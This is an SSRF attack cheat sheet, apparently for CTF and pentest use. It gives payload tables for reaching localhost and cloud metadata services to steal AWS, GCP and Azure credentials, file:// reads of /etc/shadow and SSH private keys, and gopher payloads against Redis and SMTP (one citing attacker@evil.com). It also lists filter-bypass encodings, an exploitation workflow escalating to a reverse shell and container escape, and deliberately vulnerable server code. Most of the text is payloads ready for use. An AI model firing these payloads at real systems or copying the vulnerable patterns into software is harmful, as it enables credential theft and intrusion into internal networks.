# SSRF — Server-Side Request Forgery Basics

---

## Quick Reference

| Step | Goal | Payload |
|------|------|---------|
| 1 | Confirm SSRF | `url=http://YOUR-SERVER.com/test` → check callback |
| 2 | Hit localhost | `url=http://127.0.0.1/` |
| 3 | Hit cloud metadata | `url=http://169.254.169.254/latest/meta-data/` |
| 4 | Port scan | `url=http://localhost:6379/` |
| 5 | Read files | `url=file:///etc/passwd` |
| 6 | Bypass localhost filter | `url=http://127.1/` / `url=http://2130706433/` |

```
-- Fastest localhost bypass chain (try in order):
http://127.0.0.1/
http://localhost/
http://127.1/
http://0.0.0.0/
http://[::1]/
http://2130706433/        ← 127.0.0.1 in decimal
http://0x7f000001/        ← 127.0.0.1 in hex
http://0177.0.0.1/        ← 127.0.0.1 in octal
```

---

## What is SSRF? 🔓

SSRF lets an attacker make the **server send HTTP requests on their behalf** — to internal services, localhost, cloud metadata endpoints, or arbitrary external hosts. The server acts as a proxy, and the request originates from the server's own network context — bypassing firewalls, IP allowlists, and network segmentation that would block the attacker directly.

**Impact:**
- 🔴 Access internal services — databases, admin panels, monitoring tools
- 🔴 Steal cloud credentials — AWS IAM keys, GCP tokens, Azure OAuth tokens
- 🔴 Port scan internal network — map services behind the firewall
- 🔴 Read local files — via `file://` protocol on misconfigured servers
- 🔴 Exploit internal services — Redis RCE, Docker API abuse, Elasticsearch data dump
- ⚠️ Impact scales with network position — a cloud instance has access to everything in the VPC

**The core idea:**

```
Normal flow:
User → Server → External API → Response → User

SSRF flow:
Attacker → Server → Internal Service (normally unreachable) → Response → Attacker
           ↑
           Server makes the request using its own identity and network position
```

**Why the server has more access than you:**
- It sits inside the VPC / private network
- Cloud metadata service (`169.254.169.254`) only responds to requests from the instance itself
- Internal services (Redis, Elasticsearch) bind to `0.0.0.0` without authentication
- Firewalls allow traffic between internal services but block external IPs

---

## Finding SSRF Injection Points

SSRF hides wherever the server makes a network request based on user input.

**URL parameter names to hunt:**

```
url=        target=      redirect=     fetch=
proxy=      link=        image=        src=
file=       destination= load=         remote=
path=       resource=    endpoint=     callback=
webhook=    import=      feed=         uri=
```

**Common vulnerable features:**

**URL fetchers / web scrapers:**
```http
POST /fetch-url
url=http://localhost/admin

GET /screenshot?url=http://169.254.169.254/latest/meta-data/
```

**Image / file upload from URL:**
```http
POST /upload-from-url
image_url=http://localhost:22/

POST /import-avatar
avatar_url=http://169.254.169.254/
```

**PDF / document generators:**
```http
POST /generate-pdf
content=<iframe src="http://localhost/admin"></iframe>
```

**Webhooks:**
```http
POST /webhooks/create
callback_url=http://localhost:9200/_search?q=password
```

**Proxy / relay endpoints:**
```http
GET /proxy?url=http://localhost/
GET /fetch?target=file:///etc/passwd
```

**API integrations:**
```http
POST /integrate
api_endpoint=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

⚠️ Also check: PDF generation, Markdown renderers with external images, import/export features, and any "preview URL" functionality.

---

## Detecting SSRF

**Step 1 — Confirm out-of-band:**

Use a callback server to confirm the server makes requests before trying internal targets.

```http
url=http://YOUR-SUBDOMAIN.burpcollaborator.net/
url=http://YOUR-ID.webhook.site/
url=http://YOUR-SERVER.com/ssrf-confirm
```

If your server receives a request → SSRF confirmed ✅

**Step 2 — Test localhost access:**

```
http://localhost/
http://127.0.0.1/
http://0.0.0.0/
http://[::1]/
```

Compare responses — a valid HTML response or different status/length = internal service reached.

**Step 3 — Test cloud metadata:**

```
http://169.254.169.254/latest/meta-data/
```

If you get a list of metadata keys back → running on AWS/cloud with metadata accessible ✅

**Step 4 — Port scan localhost:**

Send requests to common ports and compare response time / status code:

```
http://localhost:22/      ← SSH — quick response = open
http://localhost:80/      ← HTTP
http://localhost:3306/    ← MySQL
http://localhost:5432/    ← PostgreSQL
http://localhost:6379/    ← Redis
http://localhost:8080/    ← Alt HTTP / admin panel
http://localhost:9200/    ← Elasticsearch
http://localhost:27017/   ← MongoDB
http://localhost:2375/    ← Docker API
```

**Open port:** fast response, non-500 status, or connection banner in body.
**Closed port:** timeout, connection refused error, or 502 from the proxy.

---

## SSRF Targets

### Localhost & Internal IPs

```
http://127.0.0.1/admin
http://localhost:8080/
http://0.0.0.0:6379/
http://[::1]/

-- Private ranges to probe:
http://192.168.0.1/         ← home/office router
http://192.168.1.1/
http://10.0.0.1/            ← cloud internal
http://10.10.10.10/
http://172.16.0.1/          ← Docker default bridge
http://172.17.0.1/
```

### AWS Metadata Service

```
-- Root enumeration
http://169.254.169.254/latest/meta-data/

-- IAM credentials (most critical)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME

-- Instance info
http://169.254.169.254/latest/meta-data/instance-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-ipv4

-- User data (often contains secrets, startup scripts, flags)
http://169.254.169.254/latest/user-data/

-- Full identity document
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Google Cloud Metadata

```
-- Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/?recursive=true
http://169.254.169.254/computeMetadata/v1/
```

### Azure Metadata

```
-- Requires header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
```

### Digital Ocean Metadata

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
```

---

## Protocols

SSRF is not limited to HTTP — many servers support additional protocols that open new attack surfaces.

| Protocol | Use Case | Example |
|----------|----------|---------|
| `http://` | Internal web services, admin panels | `http://localhost:8080/admin` |
| `https://` | Internal HTTPS services | `https://localhost:8443/` |
| `file://` | Local file read | `file:///etc/passwd` |
| `gopher://` | Raw TCP — Redis, SMTP, Memcached | `gopher://localhost:6379/_INFO` |
| `dict://` | Redis, Memcached info | `dict://localhost:6379/INFO` |
| `ldap://` | LDAP directory services | `ldap://localhost:389/` |
| `tftp://` | Trivial FTP | `tftp://localhost:69/` |

**File protocol — read sensitive files:**

```
file:///etc/passwd
file:///etc/hosts
file:///etc/shadow
file:///proc/self/environ          ← environment variables
file:///proc/self/cmdline          ← running process command
file:///var/www/html/config.php
file:///app/flag.txt
file:///flag.txt
file:///root/.ssh/id_rsa
file://C:/Windows/win.ini          ← Windows
file://C:/Windows/System32/drivers/etc/hosts
```

**Gopher protocol — send raw bytes to any TCP service:**

```
-- Redis INFO
gopher://localhost:6379/_INFO%0aquit

-- Redis GET flag
gopher://localhost:6379/_GET%20flag%0aquit

-- SMTP send email
gopher://localhost:25/_HELO%20localhost%0AMAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0A.%0AQUIT
```

---

## Filter Bypasses

### Localhost Filter Bypasses

When `localhost` or `127.0.0.1` is blocked:

```
-- Alternate representations of 127.0.0.1:
http://127.1/
http://127.0.1/
http://127.00.00.01/
http://0.0.0.0/
http://0/
http://[::1]/
http://[0:0:0:0:0:0:0:1]/
http://localhost.localdomain/

-- Encoded forms:
http://2130706433/        ← decimal
http://0x7f000001/        ← hexadecimal
http://0177.0.0.1/        ← octal
http://0177.1/            ← mixed octal
http://[::ffff:127.0.0.1]/  ← IPv4-mapped IPv6
```

### IP Encoding Bypasses

```
-- 192.168.1.1 in alternate forms:
http://3232235777/        ← decimal
http://0xc0a80101/        ← hex
http://0300.0250.0.1/     ← octal
http://192.168.1.1/       ← standard (if only "localhost" is blocked)
```

### URL Parser Confusion

```
-- @ symbol — parser reads host as "legitimate.com" but sends request to 127.0.0.1
http://legitimate.com@127.0.0.1/
http://google.com@localhost/
http://legitimate.com@169.254.169.254/

-- # fragment — host check passes on the fragment, request goes to 127.0.0.1
http://127.0.0.1#legitimate.com
http://localhost#google.com
http://169.254.169.254#legitimate.com

-- Backslash (some parsers):
http://legitimate.com\@127.0.0.1/
```

### DNS-Based Bypasses

```
-- nip.io / xip.io — any subdomain resolves to the IP in the name
http://127.0.0.1.nip.io/
http://127.0.0.1.xip.io/

-- rbndr.us — alternates between two IPs (DNS rebinding)
http://7f000001.rbndr.us/          ← resolves to 127.0.0.1

-- Custom domain you control — points A record to 127.0.0.1
http://ssrf.yourdomain.com/
```

### Protocol & Encoding Bypasses

```
-- Case variation (http:// check is case-sensitive)
hTTp://127.0.0.1/
HTtP://localhost/
HTTP://LOCALHOST/

-- Unicode homoglyphs
http://ⓛⓞⓒⓐⓛⓗⓞⓢⓣ/
http://127。0。0。1/     ← fullwidth periods

-- Enclosed alphanumerics
http://①②⑦.⓪.⓪.①/
```

### Open Redirect Chain

```
-- If target has an open redirect, chain it:
http://target.com/redirect?url=http://localhost/admin
http://legitimate.com/redirect?to=http://169.254.169.254/

-- External open redirect → internal target:
http://target.com/fetch?url=http://open-redirect.site/?url=http://localhost/
```

---

## Exploitation Workflow

1. **Find the injection point** — hunt URL parameters, image upload fields, webhook configs, PDF generators
2. **Confirm SSRF out-of-band** — point `url=` at your webhook.site or Burp Collaborator; wait for callback
3. **Test localhost** — `http://127.0.0.1/` and `http://localhost/`; compare response vs external URL
4. **Test cloud metadata** — `http://169.254.169.254/latest/meta-data/`; enumerate IAM roles if present
5. **Port scan internal services** — iterate common ports on localhost; note response time and status differences
6. **Read files** — try `file:///etc/passwd`, `file:///proc/self/environ`, app config files
7. **Exploit internal services** — Redis via gopher, Elasticsearch via HTTP, Docker API via HTTP
8. **Apply bypass if filtered** — decimal IP, hex IP, `@` trick, nip.io, open redirect chain
9. **Escalate** — IAM credentials → AWS CLI access; Redis RCE → reverse shell; Docker API → container escape

---

## Common Vulnerable Patterns

**Direct URL fetch without validation:**

```python
# ❌ Vulnerable — fetches any URL the user provides
import requests

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    r = requests.get(url)          # fetches internal services too
    return r.content
```

**Image download from URL:**

```php
// ❌ Vulnerable — downloads from any URL including internal
$url = $_POST['avatar_url'];
$content = file_get_contents($url);   // supports file:// and gopher:// too
file_put_contents('/uploads/avatar.jpg', $content);
```

**PDF generator with HTML content:**

```javascript
// ❌ Vulnerable — puppeteer renders attacker HTML including iframes to internal URLs
app.post('/pdf', async (req, res) => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.setContent(req.body.html);  // attacker injects <iframe src="http://localhost/admin">
    const pdf = await page.pdf();
    res.send(pdf);
});
```

**Webhook registration without URL validation:**

```python
# ❌ Vulnerable — server POSTs to attacker-controlled internal URL on every event
@app.route('/webhook/register', methods=['POST'])
def register_webhook():
    callback_url = request.json.get('url')
    db.save_webhook(callback_url)           # no validation

def trigger_webhooks(event):
    for webhook in db.get_webhooks():
        requests.post(webhook.url, json=event)  # hits internal services
```

---

## CTF & Practical Tips

**Fastest initial checks:**

```
url=http://YOUR-ID.webhook.site/    ← confirm SSRF exists first
url=http://127.0.0.1/              ← hit localhost
url=http://169.254.169.254/latest/meta-data/  ← AWS metadata
url=file:///etc/passwd             ← file read
url=file:///flag.txt               ← CTF direct flag
```

**Speed tips:**
- ✅ Always confirm SSRF out-of-band first — don't guess at internal targets blind
- ✅ `169.254.169.254` is the fastest cloud win — try it on every CTF SSRF before anything else
- ✅ `file:///proc/self/environ` often contains flags, secrets, and DB credentials
- ✅ If `localhost` is blocked → try `127.1` first — it's the shortest bypass
- ✅ Response length difference = service exists, even if content is not returned
- ⚠️ Cloud metadata for GCP requires `Metadata-Flavor: Google` header — check if you can set custom headers
- ⚠️ Azure metadata requires `Metadata: true` header — same concern

**Common CTF scenarios:**
- **"Fetch a URL" feature** → direct SSRF, try metadata immediately
- **"Import image from URL"** → SSRF via image field, also try `file://`
- **"Internal admin panel"** → `http://localhost/admin` or `http://127.0.0.1:8080/admin`
- **"Flag in Redis"** → `gopher://localhost:6379/_GET%20flag%0aquit`
- **"Docker challenge"** → `http://localhost:2375/containers/json`
- **"AWS challenge"** → `http://169.254.169.254/latest/user-data/` — flags often in user-data

---

## Key Takeaways

- ✅ SSRF works because the server has network access the attacker doesn't — localhost, VPC, and cloud metadata are the primary targets
- ✅ Confirm existence out-of-band first (webhook.site / Burp Collaborator) before probing internal targets
- ✅ `169.254.169.254` is the single most impactful target on cloud infrastructure — always try it
- ✅ `file://` and `gopher://` expand SSRF far beyond HTTP — file read and raw TCP protocol abuse
- ✅ When `localhost` is filtered, decimal (`2130706433`), hex (`0x7f000001`), and `127.1` bypass most naive checks
- ✅ Response time and status code differences reveal open ports even when content is blocked